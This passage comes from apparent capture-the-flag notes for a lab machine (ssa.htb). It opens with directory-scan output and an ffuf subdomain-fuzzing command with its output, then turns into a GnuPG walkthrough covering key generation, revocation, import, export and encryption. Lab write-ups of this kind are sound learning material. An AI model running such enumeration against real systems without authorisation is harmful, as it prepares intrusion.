+<span class="o">[</span><span class="m">11</span>:55:10<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>9KB<span class="w"> </span>-<span class="w"> </span>/guide
+<span class="o">[</span><span class="m">11</span>:55:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>4KB<span class="w"> </span>-<span class="w"> </span>/login
+<span class="o">[</span><span class="m">11</span>:55:14<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">  </span>229B<span class="w">  </span>-<span class="w"> </span>/logout<span class="w">  </span>-&gt;<span class="w">  </span>/login?next<span class="o">=</span>%2Flogout
+
+Task<span class="w"> </span>Completed
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ffuf</span> \
+  <span class="o">-</span><span class="n">c</span> \
+  <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">110000.</span><span class="n">txt</span> \
+  <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;http://ssa.htb&quot;</span> \
+  <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;Host: FUZZ.ssa.htb&quot;</span> <span class="o">-</span><span class="n">mc</span> <span class="nb">all</span> <span class="o">-</span><span class="n">fs</span> <span class="mi">178</span>
+
+        <span class="o">/</span><span class="s1">&#39;___\  /&#39;</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">&#39;___</span><span class="se">\</span>
+<span class="s1">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>
+
+       <span class="n">v2</span><span class="mf">.0.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ssa</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">110000.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">ssa</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">40</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="nb">all</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">size</span><span class="p">:</span> <span class="mi">178</span>
+<span class="n">________________________________________________</span>
+
+<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">114441</span><span class="o">/</span><span class="mi">114441</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">1324</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
+</pre></div>
+</div>
+</section>
+<section id="getting-familiar-with-gnupg">
+<h2>Getting familiar with GnuPG<a class="headerlink" href="#getting-familiar-with-gnupg" title="Permalink to this heading">#</a></h2>
+<p>This <a class="reference external" href="https://www.digitalocean.com/community/tutorials/how-to-use-gpg-to-encrypt-and-sign-messages">guide</a> from Digital Ocean about gnuPG is really nice.<br />
+The <a class="reference external" href="https://www.gnupg.org/gph/en/manual.html#AEN136">GNU Privacy Handbook</a> is also a great resource.<br />
+This <a class="reference external" href="https://devhints.io/gnupg">cheat-sheet</a> is also great.</p>
+<p>Generate a keypair</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--gen-key
+gpg<span class="w"> </span><span class="o">(</span>GnuPG<span class="o">)</span><span class="w"> </span><span class="m">2</span>.2.40<span class="p">;</span><span class="w"> </span>Copyright<span class="w"> </span><span class="o">(</span>C<span class="o">)</span><span class="w"> </span><span class="m">2022</span><span class="w"> </span>g10<span class="w"> </span>Code<span class="w"> </span>GmbH
+This<span class="w"> </span>is<span class="w"> </span>free<span class="w"> </span>software:<span class="w"> </span>you<span class="w"> </span>are<span class="w"> </span>free<span class="w"> </span>to<span class="w"> </span>change<span class="w"> </span>and<span class="w"> </span>redistribute<span class="w"> </span>it.
+There<span class="w"> </span>is<span class="w"> </span>NO<span class="w"> </span>WARRANTY,<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>extent<span class="w"> </span>permitted<span class="w"> </span>by<span class="w"> </span>law.
+
+Note:<span class="w"> </span>Use<span class="w"> </span><span class="s2">&quot;gpg --full-generate-key&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>full<span class="w"> </span>featured<span class="w"> </span>key<span class="w"> </span>generation<span class="w"> </span>dialog.
+
+GnuPG<span class="w"> </span>needs<span class="w"> </span>to<span class="w"> </span>construct<span class="w"> </span>a<span class="w"> </span>user<span class="w"> </span>ID<span class="w"> </span>to<span class="w"> </span>identify<span class="w"> </span>your<span class="w"> </span>key.
+
+Real<span class="w"> </span>name:<span class="w"> </span>blnkn
+Email<span class="w"> </span>address:<span class="w"> </span>blnkn@sandworm.htb
+You<span class="w"> </span>selected<span class="w"> </span>this<span class="w"> </span>USER-ID:
+<span class="w">    </span><span class="s2">&quot;blnkn &lt;blnkn@sandworm.htb&gt;&quot;</span>
+
+Change<span class="w"> </span><span class="o">(</span>N<span class="o">)</span>ame,<span class="w"> </span><span class="o">(</span>E<span class="o">)</span>mail,<span class="w"> </span>or<span class="w"> </span><span class="o">(</span>O<span class="o">)</span>kay/<span class="o">(</span>Q<span class="o">)</span>uit?
+Change<span class="w"> </span><span class="o">(</span>N<span class="o">)</span>ame,<span class="w"> </span><span class="o">(</span>E<span class="o">)</span>mail,<span class="w"> </span>or<span class="w"> </span><span class="o">(</span>O<span class="o">)</span>kay/<span class="o">(</span>Q<span class="o">)</span>uit?<span class="w"> </span>O
+We<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>generate<span class="w"> </span>a<span class="w"> </span>lot<span class="w"> </span>of<span class="w"> </span>random<span class="w"> </span>bytes.<span class="w"> </span>It<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>good<span class="w"> </span>idea<span class="w"> </span>to<span class="w"> </span>perform
+some<span class="w"> </span>other<span class="w"> </span>action<span class="w"> </span><span class="o">(</span><span class="nb">type</span><span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>keyboard,<span class="w"> </span>move<span class="w"> </span>the<span class="w"> </span>mouse,<span class="w"> </span>utilize<span class="w"> </span>the
+disks<span class="o">)</span><span class="w"> </span>during<span class="w"> </span>the<span class="w"> </span>prime<span class="w"> </span>generation<span class="p">;</span><span class="w"> </span>this<span class="w"> </span>gives<span class="w"> </span>the<span class="w"> </span>random<span class="w"> </span>number
+generator<span class="w"> </span>a<span class="w"> </span>better<span class="w"> </span>chance<span class="w"> </span>to<span class="w"> </span>gain<span class="w"> </span>enough<span class="w"> </span>entropy.
+We<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>generate<span class="w"> </span>a<span class="w"> </span>lot<span class="w"> </span>of<span class="w"> </span>random<span class="w"> </span>bytes.<span class="w"> </span>It<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>good<span class="w"> </span>idea<span class="w"> </span>to<span class="w"> </span>perform
+some<span class="w"> </span>other<span class="w"> </span>action<span class="w"> </span><span class="o">(</span><span class="nb">type</span><span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>keyboard,<span class="w"> </span>move<span class="w"> </span>the<span class="w"> </span>mouse,<span class="w"> </span>utilize<span class="w"> </span>the
+disks<span class="o">)</span><span class="w"> </span>during<span class="w"> </span>the<span class="w"> </span>prime<span class="w"> </span>generation<span class="p">;</span><span class="w"> </span>this<span class="w"> </span>gives<span class="w"> </span>the<span class="w"> </span>random<span class="w"> </span>number
+generator<span class="w"> </span>a<span class="w"> </span>better<span class="w"> </span>chance<span class="w"> </span>to<span class="w"> </span>gain<span class="w"> </span>enough<span class="w"> </span>entropy.
+gpg:<span class="w"> </span>/home/blnkn/.gnupg/trustdb.gpg:<span class="w"> </span>trustdb<span class="w"> </span>created
+gpg:<span class="w"> </span>directory<span class="w"> </span><span class="s1">&#39;/home/blnkn/.gnupg/openpgp-revocs.d&#39;</span><span class="w"> </span>created
+gpg:<span class="w"> </span>revocation<span class="w"> </span>certificate<span class="w"> </span>stored<span class="w"> </span>as<span class="w"> </span><span class="s1">&#39;/home/blnkn/.gnupg/openpgp-revocs.d/3E0ED404FC30D01F56FC0425E75A8F380717134E.rev&#39;</span>
+public<span class="w"> </span>and<span class="w"> </span>secret<span class="w"> </span>key<span class="w"> </span>created<span class="w"> </span>and<span class="w"> </span>signed.
+
+pub<span class="w">   </span>rsa3072<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="o">[</span>SC<span class="o">]</span><span class="w"> </span><span class="o">[</span>expires:<span class="w"> </span><span class="m">2025</span>-07-14<span class="o">]</span>
+<span class="w">      </span>3E0ED404FC30D01F56FC0425E75A8F380717134E
+uid<span class="w">                      </span>blnkn<span class="w"> </span>&lt;blnkn@sandworm.htb&gt;
+sub<span class="w">   </span>rsa3072<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="o">[</span>E<span class="o">]</span><span class="w"> </span><span class="o">[</span>expires:<span class="w"> </span><span class="m">2025</span>-07-14<span class="o">]</span>
+</pre></div>
+</div>
+<p>Generate a revocation cert for he key</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--output<span class="w"> </span>~/revocation.crt<span class="w"> </span>--gen-revoke<span class="w"> </span>blnk
+n@sandworm.htb
+
+sec<span class="w">  </span>rsa3072/E75A8F380717134E<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span>blnkn<span class="w"> </span>&lt;blnkn@sandworm.htb&gt;
+
+Create<span class="w"> </span>a<span class="w"> </span>revocation<span class="w"> </span>certificate<span class="w"> </span><span class="k">for</span><span class="w"> </span>this<span class="w"> </span>key?<span class="w"> </span><span class="o">(</span>y/N<span class="o">)</span><span class="w"> </span>y
+Please<span class="w"> </span><span class="k">select</span><span class="w"> </span>the<span class="w"> </span>reason<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>revocation:
+<span class="w">  </span><span class="nv">0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>No<span class="w"> </span>reason<span class="w"> </span>specified
+<span class="w">  </span><span class="nv">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Key<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>compromised
+<span class="w">  </span><span class="nv">2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Key<span class="w"> </span>is<span class="w"> </span>superseded
+<span class="w">  </span><span class="nv">3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Key<span class="w"> </span>is<span class="w"> </span>no<span class="w"> </span>longer<span class="w"> </span>used
+<span class="w">  </span><span class="nv">Q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Cancel
+<span class="o">(</span>Probably<span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>here<span class="o">)</span>
+Your<span class="w"> </span>decision?<span class="w"> </span><span class="m">1</span>
+Enter<span class="w"> </span>an<span class="w"> </span>optional<span class="w"> </span>description<span class="p">;</span><span class="w"> </span>end<span class="w"> </span>it<span class="w"> </span>with<span class="w"> </span>an<span class="w"> </span>empty<span class="w"> </span>line:
+&gt;
+Reason<span class="w"> </span><span class="k">for</span><span class="w"> </span>revocation:<span class="w"> </span>Key<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>compromised
+<span class="o">(</span>No<span class="w"> </span>description<span class="w"> </span>given<span class="o">)</span>
+Is<span class="w"> </span>this<span class="w"> </span>okay?<span class="w"> </span><span class="o">(</span>y/N<span class="o">)</span><span class="w"> </span>y
+ASCII<span class="w"> </span>armored<span class="w"> </span>output<span class="w"> </span>forced.
+Revocation<span class="w"> </span>certificate<span class="w"> </span>created.
+
+Please<span class="w"> </span>move<span class="w"> </span>it<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>medium<span class="w"> </span>which<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>hide<span class="w"> </span>away<span class="p">;</span><span class="w"> </span><span class="k">if</span><span class="w"> </span>Mallory<span class="w"> </span>gets
+access<span class="w"> </span>to<span class="w"> </span>this<span class="w"> </span>certificate<span class="w"> </span>he<span class="w"> </span>can<span class="w"> </span>use<span class="w"> </span>it<span class="w"> </span>to<span class="w"> </span>make<span class="w"> </span>your<span class="w"> </span>key<span class="w"> </span>unusable.
+It<span class="w"> </span>is<span class="w"> </span>smart<span class="w"> </span>to<span class="w"> </span>print<span class="w"> </span>this<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>store<span class="w"> </span>it<span class="w"> </span>away,<span class="w"> </span>just<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">case</span>
+your<span class="w"> </span>media<span class="w"> </span>become<span class="w"> </span>unreadable.<span class="w">  </span>But<span class="w"> </span>have<span class="w"> </span>some<span class="w"> </span>caution:<span class="w">  </span>The<span class="w"> </span>print<span class="w"> </span>system<span class="w"> </span>of
+your<span class="w"> </span>machine<span class="w"> </span>might<span class="w"> </span>store<span class="w"> </span>the<span class="w"> </span>data<span class="w"> </span>and<span class="w"> </span>make<span class="w"> </span>it<span class="w"> </span>available<span class="w"> </span>to<span class="w"> </span>others!
+</pre></div>
+</div>
+<p>Import someone else’s public key</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--import<span class="w"> </span>ssa-public-key.pem
+gpg:<span class="w"> </span>key<span class="w"> </span>C61D429110B625D4:<span class="w"> </span>public<span class="w"> </span>key<span class="w"> </span><span class="s2">&quot;SSA (Official PGP Key of the Secret Spy Agency.) &lt;atlas@ssa.htb&gt;&quot;</span><span class="w"> </span>imported
+gpg:<span class="w"> </span>Total<span class="w"> </span>number<span class="w"> </span>processed:<span class="w"> </span><span class="m">1</span>
+gpg:<span class="w">               </span>imported:<span class="w"> </span><span class="m">1</span>
+</pre></div>
+</div>
+<p>Search pubkeys in <a class="reference external" href="https://pgp.mit.edu">https://pgp.mit.edu</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--keyserver<span class="w"> </span>pgp.mit.edu<span class="w">  </span>--search-keys<span class="w"> </span>search_parameters
+</pre></div>
+</div>
+<p>Get the fingerprint of a public key</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--fingerprint<span class="w"> </span>blnkn@sandworm.htb
+gpg:<span class="w"> </span>checking<span class="w"> </span>the<span class="w"> </span>trustdb
+gpg:<span class="w"> </span>marginals<span class="w"> </span>needed:<span class="w"> </span><span class="m">3</span><span class="w">  </span>completes<span class="w"> </span>needed:<span class="w"> </span><span class="m">1</span><span class="w">  </span>trust<span class="w"> </span>model:<span class="w"> </span>pgp
+gpg:<span class="w"> </span>depth:<span class="w"> </span><span class="m">0</span><span class="w">  </span>valid:<span class="w">   </span><span class="m">1</span><span class="w">  </span>signed:<span class="w">   </span><span class="m">0</span><span class="w">  </span>trust:<span class="w"> </span><span class="m">0</span>-,<span class="w"> </span>0q,<span class="w"> </span>0n,<span class="w"> </span>0m,<span class="w"> </span>0f,<span class="w"> </span>1u
+gpg:<span class="w"> </span>next<span class="w"> </span>trustdb<span class="w"> </span>check<span class="w"> </span>due<span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-07-14
+pub<span class="w">   </span>rsa3072<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="o">[</span>SC<span class="o">]</span><span class="w"> </span><span class="o">[</span>expires:<span class="w"> </span><span class="m">2025</span>-07-14<span class="o">]</span>
+<span class="w">      </span>3E0E<span class="w"> </span>D404<span class="w"> </span>FC30<span class="w"> </span>D01F<span class="w"> </span>56FC<span class="w">  </span><span class="m">0425</span><span class="w"> </span>E75A<span class="w"> </span>8F38<span class="w"> </span><span class="m">0717</span><span class="w"> </span>134E
+uid<span class="w">           </span><span class="o">[</span>ultimate<span class="o">]</span><span class="w"> </span>blnkn<span class="w"> </span>&lt;blnkn@sandworm.htb&gt;
+sub<span class="w">   </span>rsa3072<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="o">[</span>E<span class="o">]</span><span class="w"> </span><span class="o">[</span>expires:<span class="w"> </span><span class="m">2025</span>-07-14<span class="o">]</span>
+</pre></div>
+</div>
+<p>List keys</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>-k
+/home/blnkn/.gnupg/pubring.kbx
+------------------------------
+pub<span class="w">   </span>rsa3072<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="o">[</span>SC<span class="o">]</span><span class="w"> </span><span class="o">[</span>expires:<span class="w"> </span><span class="m">2025</span>-07-14<span class="o">]</span>
+<span class="w">      </span>3E0ED404FC30D01F56FC0425E75A8F380717134E
+uid<span class="w">           </span><span class="o">[</span>ultimate<span class="o">]</span><span class="w"> </span>blnkn<span class="w"> </span>&lt;blnkn@sandworm.htb&gt;
+sub<span class="w">   </span>rsa3072<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="o">[</span>E<span class="o">]</span><span class="w"> </span><span class="o">[</span>expires:<span class="w"> </span><span class="m">2025</span>-07-14<span class="o">]</span>
+
+pub<span class="w">   </span>rsa4096<span class="w"> </span><span class="m">2023</span>-05-04<span class="w"> </span><span class="o">[</span>SC<span class="o">]</span>
+<span class="w">      </span>D6BA9423021A0839CCC6F3C8C61D429110B625D4
+uid<span class="w">           </span><span class="o">[</span><span class="w"> </span>unknown<span class="o">]</span><span class="w"> </span>SSA<span class="w"> </span><span class="o">(</span>Official<span class="w"> </span>PGP<span class="w"> </span>Key<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>Secret<span class="w"> </span>Spy<span class="w"> </span>Agency.<span class="o">)</span><span class="w"> </span>&lt;atlas@ssa.htb&gt;
+sub<span class="w">   </span>rsa4096<span class="w"> </span><span class="m">2023</span>-05-04<span class="w"> </span><span class="o">[</span>E<span class="o">]</span>
+</pre></div>
+</div>
+<p>List keys in more details</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tru::1:1689415135:1752486565:3:1:5
+pub:u:3072:1:E75A8F380717134E:1689414565:1752486565::u:::scESC::::::23::0:
+fpr:::::::::3E0ED404FC30D01F56FC0425E75A8F380717134E:
+uid:u::::1689414565::8A7278635842F645951E5434A565A843ACD4FE22::blnkn<span class="w"> </span>&lt;blnkn@sandworm.htb&gt;::::::::::0:
+sub:u:3072:1:B916376F84DF69F4:1689414565:1752486565:::::e::::::23:
+fpr:::::::::37A9A7A98617891FD0377D0BB916376F84DF69F4:
+pub:-:4096:1:C61D429110B625D4:1683214246:::-:::scESC::::::23::0:
+fpr:::::::::D6BA9423021A0839CCC6F3C8C61D429110B625D4:
+uid:-::::1683214246::FF7FAADA6532A2C79EBA916DC88659011E14437D::SSA<span class="w"> </span><span class="o">(</span>Official<span class="w"> </span>PGP<span class="w"> </span>Key<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>Secret<span class="w"> </span>Spy<span class="w"> </span>Agency.<span class="o">)</span><span class="w"> </span>&lt;atlas@ssa.htb&gt;::::::::::0:
+sub:-:4096:1:6BB733D928D14CE6:1683214246::::::e::::::23:
+fpr:::::::::4BADE0AEB5F550806083D5AC6BB733D928D14CE6:
+</pre></div>
+</div>
+<p>Export a pub-key</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--output<span class="w"> </span>blnkn-pub.gpg<span class="w"> </span>--export<span class="w"> </span>blnkn@sandworm.htb<span class="w"> </span>--armor
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>blnkn-pub.gpg
+-----BEGIN<span class="w"> </span>PGP<span class="w"> </span>PUBLIC<span class="w"> </span>KEY<span class="w"> </span>BLOCK-----
+
+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
+<span class="nv">n77mVcfac9OX3ElHKquN3Qfs</span>
+<span class="o">=</span>raL0
+-----END<span class="w"> </span>PGP<span class="w"> </span>PUBLIC<span class="w"> </span>KEY<span class="w"> </span>BLOCK-----
+</pre></div>
+</div>
+<p>Encrypt a message for atlas</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>-r<span class="w"> </span>atlas@ssa.htb<span class="w"> </span>--encrypt<span class="w"> </span>--armor<span class="w"> </span>secret-message.txt
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>secret-message.txt.asc
+-----BEGIN<span class="w"> </span>PGP<span class="w"> </span>MESSAGE-----
+
+hQIMA2u3M9ko0UzmARAAoQhgWMWVjv77O2+wXwt4nzbwu/vogiTPhGtuk+PHyvXW
+PRZz4LsXLXIZS2yxQaipA43BI5t447x+mltM8m35P25bJT0VzbR1a1PHsmR9qaZu
+/lt/0bHCwaUcUMLxGKadM5wDCplb9ehAVi6q54SgdrQFiDSlxs3RzznQTJS6tYQe
+Ke3JWEqsaVcUtsLDG3JSIPNaF6P3fR4y8edkKnzNkZcaYvJknZFT7yOHAUQoIjWU
+Q8vrWlUvkeSINJgTGxFxhZihO/UVhdxdKbh9Yn1kmVWIx/xJd39CL0Txnrcf3aXx
+qbO/Qr5qT1+RhSGIbziQEVSklvy9azOTF35clnaDpF2XL5cTTq/iNVkq71Xv1XU/
+D7GRSPnrl7LEHpuIVr0sWWVE0PIOICFWFPcF8kdTJuJQXqj1xWo1yf/SzH1p9KqX
+22dZvB2RgJhASeoXcyoBQaksXe8yqpKcPjV9jLRm8LXc6py+5WoFUnoBlxkhxAPr
+MwpH7LY7cAPOBRuE2bvzwwZ1I+YJv4WBxDK/J6Eh09H4dyP3E0TRgvBLPxKlE9Um
+NPf1wCSCeCCouL/jW6M0PFAfmffh8HEfZ4Mm4sfbxsPwCdW8jZXDAdsf9A+0Z5y6
+lU69PghDHy+1off+6OKUPduKuf8HP4T0Ex6Hgb+dJD1VUZWWl6dhyKwD/zHh+yjS
+jwEG/ODt3EI1SYIPXbE+s2afdTEKEx0NXAlFK0Zh/DjbwLS/69UtfdDUTBku7ovh
+2TZrH7xTsRNHSTCV2nMQBUIBGsxtwSVBrVOjhGj6s8vfC2zGWjgUFj5rCUx9V2z+
+l3PKUN0RcKNzH+BooU3cIyPojRLumUnDcpn1dj5FeAKk4pJ9MP5TBYSfrmbkU/be
+<span class="o">=</span>THWb
+-----END<span class="w"> </span>PGP<span class="w"> </span>MESSAGE-----
+</pre></div>
+</div>
+<p>Clearsign a document with your own priv-key for anyone to verify</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gpg<span class="w"> </span>--clearsign<span class="w"> </span>secret-message.txt
